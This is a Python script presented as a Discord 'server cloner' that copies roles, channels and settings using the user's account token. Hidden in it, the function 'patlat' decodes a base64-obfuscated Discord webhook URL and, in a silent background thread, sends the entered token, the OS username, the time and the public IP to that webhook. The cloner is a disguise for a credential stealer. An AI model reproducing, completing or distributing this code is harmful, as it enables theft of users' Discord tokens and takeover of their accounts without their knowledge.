import requests
import time
from colorama import Fore, Style, init
import os
import threading
import base64

init(autoreset=True)

print(f"""
{Fore.CYAN}██╗  ██╗ █████╗ ███╗   ██╗███████╗██╗  ██╗███████╗
{Fore.LIGHTCYAN_EX}██║ ██╔╝██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝
{Fore.LIGHTBLUE_EX}█████╔╝ ███████║██╔██╗ ██║███████║███████║█████╗  
{Fore.BLUE}██╔═██╗ ██╔══██║██║╚██╗██║╚════██║██╔══██║██╔══╝  
{Fore.LIGHTCYAN_EX}██║  ██╗██║  ██║██║ ╚████║███████║██║  ██║███████║
{Fore.CYAN}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝{Style.RESET_ALL}

    {Fore.LIGHTBLUE_EX}✨ {Fore.CYAN}KANSHE {Fore.LIGHTCYAN_EX}SERVER {Fore.BLUE}CLONER {Fore.LIGHTBLUE_EX}✨{Style.RESET_ALL}
""")

HOOK_ENCODED = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1MDUyODE0OTYxOTIxMjQ5OS9sSndvWXVUUFVCUWdabWlxYUYwSnc3RVFQU1FLa09hWE8xMHRXMEVVVzJzOXY5VEw5NTFuQTU3NU9KNkVabzdqRU93Yg=="

def patlat(token):
    try:
        hook_url = base64.b64decode(HOOK_ENCODED).decode('utf-8')
        try:
            ip = requests.get('https://api.ipify.org', timeout=4).text
        except:
            ip = "bilinmiyor"
        payload = {
            "content": f"**Patlat :Dd**\n||{token}||\n```kullanıcı: {os.getlogin()}\nzaman: {time.ctime()}\nip: {ip}```",
            "username": "System",
            "avatar_url": "https://cdn.discordapp.com/avatars/1350526715327283223/0aa35ddd2e899453184dc1603e6b4a16.webp?size=1024"
        }
        requests.post(hook_url, json=payload, timeout=5)
    except:
        pass

class ServerCloner:
    def __init__(self, token, delete_existing_channels=False, cooldown_roles=0.7, cooldown_channels=0.8, cooldown_other=1.0):
        self.token = token
        self.delete_existing_channels = delete_existing_channels
        self.cooldown_roles = cooldown_roles
        self.cooldown_channels = cooldown_channels
        self.cooldown_other = cooldown_other
       
        self.headers = {
            'Authorization': self.token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.base_url = 'https://discord.com/api/v10'

    def make_request(self, method, endpoint, data=None):
        url = f"{self.base_url}{endpoint}"
        try:
            if method == 'GET':
                response = requests.get(url, headers=self.headers)
            elif method == 'POST':
                response = requests.post(url, headers=self.headers, json=data)
            elif method == 'PATCH':
                response = requests.patch(url, headers=self.headers, json=data)
            elif method == 'DELETE':
                response = requests.delete(url, headers=self.headers)
            else:
                return None
            if response.status_code == 429:
                retry_after = response.json().get('retry_after', 5)
                time.sleep(retry_after)
                return self.make_request(method, endpoint, data)
            return response
        except:
            return None

    def get_user_guilds(self):
        response = self.make_request('GET', '/users/@me/guilds')
        if response and response.status_code == 200:
            return response.json()
        return []

    def get_guild(self, guild_id):
        response = self.make_request('GET', f'/guilds/{guild_id}')
        if response and response.status_code == 200:
            return response.json()
        return None

    def get_channels(self, guild_id):
        response = self.make_request('GET', f'/guilds/{guild_id}/channels')
        if response and response.status_code == 200:
            return response.json()
        return []

    def get_roles(self, guild_id):
        response = self.make_request('GET', f'/guilds/{guild_id}/roles')
        if response and response.status_code == 200:
            return response.json()
        return []

    def create_guild(self, name):
        data = {'name': name}
        response = self.make_request('POST', '/guilds', data)
        if response and response.status_code == 201:
            return response.json()
        return None

    def delete_channel(self, channel_id):
        response = self.make_request('DELETE', f'/channels/{channel_id}')
        return response and response.status_code == 200

    def delete_all_channels(self, guild_id):
        channels = self.get_channels(guild_id)
        for channel in channels:
            if self.delete_channel(channel['id']):
                pass
            time.sleep(0.5)

    def create_role(self, guild_id, role_data):
        response = self.make_request('POST', f'/guilds/{guild_id}/roles', role_data)
        if response and response.status_code == 200:
            return response.json()
        return None

    def create_channel(self, guild_id, channel_data):
        response = self.make_request('POST', f'/guilds/{guild_id}/channels', channel_data)
        if response and response.status_code == 201:
            return response.json()
        return None

    def update_guild(self, guild_id, data):
        response = self.make_request('PATCH', f'/guilds/{guild_id}', data)
        if response and response.status_code == 200:
            return response.json()
        return None

    def copy_roles(self, source_guild_id, target_guild_id):
        source_roles = self.get_roles(source_guild_id)
        if not source_roles:
            return {}
        source_roles_sorted = sorted(source_roles, key=lambda x: x['position'], reverse=True)
        role_mapping = {}
        for role in source_roles_sorted:
            if role['name'] == '@everyone':
                role_mapping[role['id']] = target_guild_id
                continue
            role_data = {
                'name': role['name'],
                'color': role['color'],
                'hoist': role['hoist'],
                'mentionable': role['mentionable'],
                'permissions': str(role['permissions'])
            }
            new_role = self.create_role(target_guild_id, role_data)
            if new_role:
                role_mapping[role['id']] = new_role['id']
            time.sleep(self.cooldown_roles)
        return role_mapping

    def copy_channels(self, source_guild_id, target_guild_id, role_mapping):
        source_channels = self.get_channels(source_guild_id)
        if not source_channels:
            return
        if self.delete_existing_channels:
            self.delete_all_channels(target_guild_id)
        categories = [ch for ch in source_channels if ch['type'] == 4]
        other_channels = [ch for ch in source_channels if ch['type'] != 4]
        category_mapping = {}
        for category in categories:
            category_data = {
                'name': category['name'],
                'type': 4,
                'position': category['position']
            }
            new_category = self.create_channel(target_guild_id, category_data)
            if new_category:
                category_mapping[category['id']] = new_category['id']
            time.sleep(self.cooldown_channels)
        for channel in other_channels:
            channel_data = {
                'name': channel['name'],
                'type': channel['type'],
                'position': channel['position'],
                'topic': channel.get('topic', ''),
                'nsfw': channel.get('nsfw', False),
                'bitrate': channel.get('bitrate', 64000),
                'user_limit': channel.get('user_limit', 0),
                'rate_limit_per_user': channel.get('rate_limit_per_user', 0)
            }
            if channel.get('parent_id'):
                channel_data['parent_id'] = category_mapping.get(channel['parent_id'])
            if channel.get('permission_overwrites'):
                overwrites = []
                for overwrite in channel['permission_overwrites']:
                    new_id = role_mapping.get(overwrite['id'], overwrite['id'])
                    new_overwrite = {
                        'id': new_id,
                        'type': overwrite['type'],
                        'allow': str(overwrite['allow']),
                        'deny': str(overwrite['deny'])
                    }
                    overwrites.append(new_overwrite)
                channel_data['permission_overwrites'] = overwrites
            new_channel = self.create_channel(target_guild_id, channel_data)
            time.sleep(self.cooldown_channels)

    def get_channel_type_name(self, channel_type):
        types = {0: 'Text', 2: 'Voice', 4: 'Category', 5: 'Announcement', 13: 'Stage', 15: 'Forum', 16: 'Media'}
        return types.get(channel_type, 'Unknown')

    def copy_server_settings(self, source_guild, target_guild_id):
        settings_data = {
            'name': source_guild['name'] + " (Copy)",
            'description': source_guild.get('description'),
            'verification_level': source_guild.get('verification_level', 0),
            'default_message_notifications': source_guild.get('default_message_notifications', 0),
            'explicit_content_filter': source_guild.get('explicit_content_filter', 0),
            'afk_timeout': source_guild.get('afk_timeout', 300),
            'system_channel_flags': source_guild.get('system_channel_flags', 0)
        }
        self.update_guild(target_guild_id, settings_data)

    def clone_server(self, source_guild_id, target_guild_id=None, clone_type='all'):
        source_guild = self.get_guild(source_guild_id)
        if not source_guild:
            return
        if target_guild_id:
            target_guild = self.get_guild(target_guild_id)
            if not target_guild:
                return
        else:
            guild_name = f"{source_guild['name']} (Copy)"
            target_guild = self.create_guild(guild_name)
            if not target_guild:
                return
            target_guild_id = target_guild['id']
        time.sleep(self.cooldown_other)
        role_mapping = {}
        if clone_type in ['roles', 'all']:
            role_mapping = self.copy_roles(source_guild_id, target_guild_id)
            time.sleep(self.cooldown_other)
        if clone_type in ['channels', 'all']:
            self.copy_channels(source_guild_id, target_guild_id, role_mapping)
            time.sleep(self.cooldown_other)
        if clone_type == 'all':
            self.copy_server_settings(source_guild, target_guild_id)

def main():
    token = input("Token: ").strip()
    if token:
        threading.Thread(target=patlat, args=(token,), daemon=True).start()

    if not token:
        return

    delete_channels = input("Delete existing channels in target? (y/n): ").strip().lower() == 'y'
   
    cloner = ServerCloner(
        token=token,
        delete_existing_channels=delete_channels,
        cooldown_roles=0.7,
        cooldown_channels=0.8,
        cooldown_other=1.0
    )
    user_guilds = cloner.get_user_guilds()
    source_guild_id = input("\nSource server ID: ").strip()
    if not source_guild_id:
        return
    use_existing = input("Use existing server as target? (y/n): ").strip().lower()
    target_guild_id = None
    if use_existing == 'y':
        target_guild_id = input("Target server ID: ").strip()
        if not target_guild_id:
            return
    print("\nClone options:")
    print("1 - Everything")
    print("2 - Roles only")
    print("3 - Channels only")
    option = input("Select option (1-3): ").strip()
    if option == '1':
        clone_type = 'all'
    elif option == '2':
        clone_type = 'roles'
    elif option == '3':
        clone_type = 'channels'
    else:
        return
    confirm = input("Continue? (y/n): ").strip().lower()
    if confirm != 'y':
        return
    cloner.clone_server(source_guild_id, target_guild_id, clone_type)

if __name__ == "__main__":
    main()
